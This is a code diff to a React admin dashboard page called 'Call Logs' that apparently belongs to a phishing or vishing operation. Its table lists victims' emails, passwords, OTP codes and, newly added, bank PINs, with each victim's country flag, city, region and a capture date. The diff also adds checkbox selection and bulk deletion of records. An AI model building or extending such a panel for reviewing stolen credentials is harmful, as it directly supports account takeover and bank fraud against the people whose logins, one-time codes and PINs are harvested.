@@ -158,15 +158,18 @@ import { Button, Card, Col, Pagination, Row } from "react-bootstrap";
 import { deleteAccounts, getAccounts } from "@/shared/Api/dashboard";
 import { useDispatch, useSelector } from "react-redux";
 import { Trash2 } from "lucide-react";
+import { FaTrash } from "react-icons/fa";
+import moment from "moment";
 
 function CallLogsPage() {
   const dispatch = useDispatch();
   const user = useSelector((state: any) => state.auth.user);
   const accounts = useSelector((state: any) => state.dash.accounts);
-
   const [currentPage, setCurrentPage] = useState(1); // Pagination: current page
   const [totalAccounts, setTotalAccounts] = useState(0); // Total accounts count
   const [limit] = useState(10); // Number of entries per page (can be adjusted)
+  const [selectedAccounts, setSelectedAccounts] = useState<string[]>([]); // For tracking selected accounts
+
   
   useEffect(() => {
     fetchAccounts(currentPage);
@@ -183,12 +186,41 @@ function CallLogsPage() {
     fetchAccounts(currentPage); // Refresh after deletion
   };
 
+    // Delete selected accounts
+    const handleDeleteSelectedAccounts = async () => {
+      await Promise.all(selectedAccounts.map((id) => deleteAccounts({ id }, dispatch)));
+      setSelectedAccounts([]); // Clear selected accounts
+      fetchAccounts(currentPage); // Refresh after deletion
+    };
+    // const filterAccounts = (accountsToDelete: any) => {
+    //   deleteAccounts({ id: accountsToDelete?._id }, dispatch);
+    // };
+
   // Handle page change
   const handlePageChange = (pageNumber: number) => {
     setCurrentPage(pageNumber);
   };
 
   const totalPages = Math.ceil(totalAccounts / limit);
+
+    // Handle checkbox toggle for each account
+    const toggleSelectAccount = (accountId: string) => {
+      setSelectedAccounts((prevSelected) =>
+        prevSelected.includes(accountId)
+          ? prevSelected.filter((id) => id !== accountId)
+          : [...prevSelected, accountId]
+      );
+    };
+  
+    // Handle "select all" checkbox
+    const toggleSelectAll = () => {
+      if (selectedAccounts.length === accounts.length) {
+        setSelectedAccounts([]);
+      } else {
+        setSelectedAccounts(accounts.map((account: any) => account._id));
+      }
+    };
+  
 
   return (
     <Fragment>
@@ -199,14 +231,25 @@ function CallLogsPage() {
             <Card.Header className="justify-content-between">
               <Card.Title>Call Logs</Card.Title>
               <div className="d-flex flex-wrap gap-2">
-                <div>
+                <div className="flex justify-between gap-2">
                   <input
                     className="form-control form-control-sm"
                     type="text"
                     placeholder="Search Here"
                     aria-label=".form-control-sm example"
                   />
+                {/* Delete Selected Button */}
+              <div title="Delete selected logs" className="hover:text-red-500">
+              <Button
+                  className="btn-md bg-[#546dfe]"
+                  onClick={()=>{handleDeleteSelectedAccounts()}}
+                  disabled={selectedAccounts.length === 0}
+                  hidden={selectedAccounts.length === 0}
+                >
+                  <FaTrash size={14} className="hover:text-red-400"/>
+                </Button>
                 </div>
+              </div>
               </div>
             </Card.Header>
             <Card.Body className="p-0">
@@ -214,13 +257,22 @@ function CallLogsPage() {
                 <table className="table text-nowrap">
                   <thead>
                     <tr>
+                      <th>
+                        <input
+                          title="select all"
+                          className="mt-1"
+                          type="checkbox"
+                          checked={selectedAccounts.length === accounts.length}
+                          onChange={toggleSelectAll}
+                          />
+                      </th>
                       <th>Email</th>
                       <th>Password</th>
                       <th>Otp</th>
-                      <th>Browser</th>
-                      <th>Country</th>
-                      <th>City</th>
+                      <th>Bank Pin</th>
+                      <th>Country Flag</th>
                       <th>State</th>
+                      <th>Date</th>
                       <th>Action</th>
                     </tr>
                   </thead>
@@ -228,6 +280,13 @@ function CallLogsPage() {
                     {accounts?.length > 0 &&
                       accounts.map((account: any) => (
                         <tr key={account._id}>
+                          <td>
+                            <input
+                              type="checkbox"
+                              checked={selectedAccounts.includes(account._id)}
+                              onChange={() => toggleSelectAccount(account._id)}
+                            />
+                          </td>
                           <td>
                             <div className="d-flex">
                               <div className="ms-2">
@@ -247,15 +306,27 @@ function CallLogsPage() {
                           </td>
                           <td>
                             <span className="fw-semibold fs-13">
-                              {"browser info"}
+                              {account.bankPin}
                             </span>
                             <span className="d-block text-muted fs-12">
-                              {account?.location?.country}
+                              {/* {account?.location?.country} */}
                             </span>
                           </td>
-                          <td>{account?.location?.country}</td>
-                          <td>{account?.location?.city}</td>
+                          <td>
+                            <img
+                            src={`https://flagcdn.com/16x12/${account?.location?.countryCode.toLowerCase()}.png`}
+                            alt={account?.location?.country}
+                            width="16"
+                            height="12"
+                            title={`${account?.location?.country}, ${account?.location?.city}`}
+                            />
+                          </td>
                           <td>{account?.location?.region}</td>
+                          <td>
+                            <div className="btn-list">
+                              {moment(account.createdAt).format('ddd, MMM DD,YYYY')}
+                            </div>
+                          </td>
                           <td>
                             <div className="btn-list">
                               <Button
@@ -276,7 +347,7 @@ function CallLogsPage() {
             <Card.Footer>
               <div className="d-flex align-items-center">
                 <div>
-                  Showing {accounts.length} Entries of {totalAccounts}{" "}
+                  Showing Entries of {totalAccounts}{" "}
                   <i className="bi bi-arrow-right ms-2 fw-semibold"></i>
                 </div>
                 <div className="ms-auto">
